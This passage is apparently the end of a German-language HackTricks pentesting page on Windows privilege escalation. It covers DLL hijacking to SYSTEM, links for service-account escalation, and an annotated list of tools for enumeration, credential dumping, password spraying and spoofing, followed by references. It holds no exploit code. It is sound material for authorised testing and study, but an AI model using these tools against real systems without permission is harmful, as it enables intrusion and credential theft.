Wenn du es schaffst, eine dll zu **hijacken**, die von einem als **SYSTEM** laufenden **process** **geladen** wird, kannst du beliebigen Code mit diesen Berechtigungen ausführen. Daher ist Dll Hijacking auch für diese Art der privilege escalation nützlich und zudem aus einem high integrity-Prozess **viel einfacher zu erreichen**, da er **write permissions** auf den Ordnern hat, die zum Laden von dlls verwendet werden.\
**Du kannst** [**hier mehr über Dll hijacking erfahren**](dll-hijacking/index.html)**.**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**Lies:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Useful tools

**Best tool to look for Windows local privilege escalation vectors:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Prüft auf Fehlkonfigurationen und sensible Dateien (**[**hier prüfen**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Detected.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Prüft auf einige mögliche Fehlkonfigurationen und sammelt Infos (**[**hier prüfen**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Prüft auf Fehlkonfigurationen**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- Es extrahiert PuTTY-, WinSCP-, SuperPuTTY-, FileZilla- und RDP-gespeicherte Session-Informationen. Use -Thorough in local.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Extrahiert crendentials aus Credential Manager. Detected.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Spray gathered passwords across domain**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh ist ein PowerShell ADIDNS/LLMNR/mDNS spoofer und man-in-the-middle tool.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Grundlegende privesc Windows enumeration**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- Suche nach bekannten privesc vulnerabilities (DEPRECATED for Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Lokale checks **(Need Admin rights)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Suche nach bekannten privesc vulnerabilities (needs to be compiled using VisualStudio) ([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Enumeriert den Host und sucht nach Fehlkonfigurationen (eher ein gather info tool als privesc) (needs to be compiled) **(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Extrahiert credentials aus vielen softwares (precompiled exe in github)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Port von PowerUp nach C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- Prüft auf misconfiguration (executable precompiled in github). Not recommended. It does not work well in Win10.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Prüft auf mögliche Fehlkonfigurationen (exe aus python). Not recommended. It does not work well in Win10.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Tool, erstellt auf Basis dieses Posts (es braucht keinen accesschk, um korrekt zu funktionieren, kann es aber verwenden).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Liest die Ausgabe von **systeminfo** und empfiehlt funktionierende exploits (lokales python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Liest die Ausgabe von **systeminfo** und empfiehlt funktionierende exploits (lokales python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

Du musst das Projekt mit der richtigen Version von .NET kompilieren ([siehe hier](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Um die installierte Version von .NET auf dem Opfer-Host zu sehen, kannst du Folgendes tun:
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## References

- [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)
- [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)
- [https://www.youtube.com/watch?v=_8xJaaQlpBo](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

- [0xdf – HTB/VulnLab JobTwo: Word VBA macro phishing via SMTP → hMailServer credential decryption → Veeam CVE-2023-27532 to SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) and kernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)

- [Check Point Research – Chasing the Silver Fox: Cat & Mouse in Kernel Shadows](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [Unit 42 – Privileged File System Vulnerability Present in a SCADA System](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [Symbolic Link Testing Tools – CreateSymlink usage](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [A Link to the Past. Abusing Symbolic Links on Windows](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [RIP RegPwn – MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [RegPwn BOF (Cobalt Strike BOF port)](https://github.com/Flangvik/RegPwnBOF)
- [ZDI - Node.js Trust Falls: Dangerous Module Resolution on Windows](https://www.thezdi.com/blog/2026/4/8/nodejs-trust-falls-dangerous-module-resolution-on-windows)
- [Node.js modules: loading from `node_modules` folders](https://nodejs.org/api/modules.html#loading-from-node_modules-folders)
- [npm package.json: `optionalDependencies`](https://docs.npmjs.com/cli/v11/configuring-npm/package-json#optionaldependencies)
- [Process Monitor (Procmon)](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)

{{#include ../../banners/hacktricks-training.md}}
